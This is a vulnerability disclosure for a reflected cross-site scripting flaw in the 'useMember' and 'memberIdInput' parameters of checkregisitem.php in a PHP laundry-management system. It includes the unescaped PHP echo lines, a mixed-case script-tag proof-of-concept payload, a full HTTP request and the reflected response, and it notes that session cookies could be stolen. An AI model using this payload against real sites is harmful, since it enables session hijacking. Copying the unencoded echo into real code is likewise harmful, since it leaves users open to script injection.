## SIMPLE_LAUNDRY_SYSTEM checkregisitem.php Reflected Cross-Site Scripting Vulnerability

### I. Vulnerability Impact

The `useMember` parameter of `checkregisitem.php` is echoed into the HTML response without any encoding, so an attacker who submits a crafted registration form can execute arbitrary JavaScript in the browser of the staff member or administrator who processes it. Because the session cookie issued by this application is not marked `HttpOnly`, the injected script can read `document.cookie` and take over the victim's staff session, which grants access to member management, staff management and the service order functions of the laundry shop.

### II. Source Code Analysis

The vulnerability resides in `checkregisitem.php`, lines 8-11:

```php
$memberIdToRegis= $_POST['memberIdInput'];
$useMember =  $_POST['useMember'];
echo "userMemberCheckBOx:".$useMember."<br>";
echo "MemberId:".$memberIdToRegis."<br>";
```

`$_POST['useMember']` is concatenated into the response with `echo` and no `htmlspecialchars()`, `htmlentities()` or `strip_tags()` call, so any markup it contains is delivered to the browser as-is. The same applies to `$_POST['memberIdInput']` on the following line, which gives a second injection point in the same response. The page is served with `Content-Type: text/html; charset=UTF-8`, which means the browser parses the reflected string as HTML and executes any script tag it contains.

The vulnerable block is guarded by the condition on line 5:

```php
if (isset($_POST['regisItemSubmit']) && ($_SESSION['userStatus']=="ADMIN"||$_SESSION['userStatus']=="STAFF")){
```

so the reflection only happens for a request made by an authenticated staff or administrator account. No further validation of `useMember` is performed: the echo on line 10 executes before the value is compared against `1` or `0`, so the payload is reflected even when the request ends in the `Member id not found` branch.

### III. Payload

The injection payload is:

```
<ScRiPt>alert(1)</sCrIpT>
```

and the complete request body that carries it:

```
Long-arm-shirtVol=0&Short-arm-shirtVol=0&Long-arm-t-shirtVol=0&Short-arm-t-shirtVol=0&TrousersVol=0&ShortsVol=0&JeansVol=0&Long-skirtVol=0&Short-skirtCheckBox=Short-skirtIsChecked&Short-skirtVol=0&Dressing-coatVol=0&Doctor-suitVol=0&TowelVol=0&haveMemberCheckbox=on&memberIdInput=4&useMember=<ScRiPt>alert(1)</sCrIpT>&regisItemSubmit=regisItem
```

The mixed case is used because only exact lowercase matching filters would look for `<script>`, and none exists here anyway. The value reaches the page unmodified:

```html
userMemberCheckBOx:<ScRiPt>alert(1)</sCrIpT><br>MemberId:4<br>
```

```
POST /checkregisitem.php HTTP/1.1
Host: bbn
Content-Length: 346
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Origin: http://bbn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/regisitem.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive

Long-arm-shirtVol=0&Short-arm-shirtVol=0&Long-arm-t-shirtVol=0&Short-arm-t-shirtVol=0&TrousersVol=0&ShortsVol=0&JeansVol=0&Long-skirtVol=0&Short-skirtCheckBox=Short-skirtIsChecked&Short-skirtVol=0&Dressing-coatVol=0&Doctor-suitVol=0&TowelVol=0&haveMemberCheckbox=on&memberIdInput=4&useMember=<ScRiPt>alert(1)</sCrIpT>&regisItemSubmit=regisItem
```

The response returns the payload unencoded inside an HTML document, which proves that the browser will parse and execute it:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:12:14 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Refresh: 3; url=regisItem.php
Content-Length: 198

userMemberCheckBOx:<ScRiPt>alert(1)</sCrIpT><br>MemberId:4<br>
<h1>Member id not found </h1>
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030171358708](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030171358708.png)

